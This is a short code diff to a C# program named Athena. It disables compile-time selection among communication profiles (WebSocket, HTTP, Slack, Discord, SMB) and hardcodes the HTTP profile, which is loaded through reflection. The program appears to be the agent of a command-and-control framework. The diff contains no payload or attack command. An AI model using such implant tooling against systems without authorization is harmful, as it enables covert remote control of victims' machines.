@@ -1,6 +1,6 @@
-﻿#if DEBUG
-#define HTTP
-#endif
+﻿//#if DEBUG
+//#define HTTP
+//#endif
 using Athena.Commands;
 using Athena.Commands.Model;
 using Athena.Models.Athena.Commands;
@@ -53,18 +53,18 @@ namespace Athena
 
         private IConfig GetConfig()
         {
-#if WEBSOCKET
-string profile = "AthenaWebsocket";
-#elif HTTP
-string profile = "Athena.Profiles.HTTP";
-#elif SLACK
-string profile = "AthenaSlack";
-#elif DISCORD
-string profile = "AthenaDiscord";
-#elif SMB
-string profile = "AthenaSMB";
-#endif
-
+//#if WEBSOCKET
+//string profile = "AthenaWebsocket";
+//#elif HTTP
+//string profile = "Athena.Profiles.HTTP";
+//#elif SLACK
+//string profile = "AthenaSlack";
+//#elif DISCORD
+//string profile = "AthenaDiscord";
+//#elif SMB
+//string profile = "AthenaSMB";
+//#endif
+            string profile = "Athena.Profiles.HTTP";
             Assembly _tasksAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
 
             if (_tasksAsm == null)
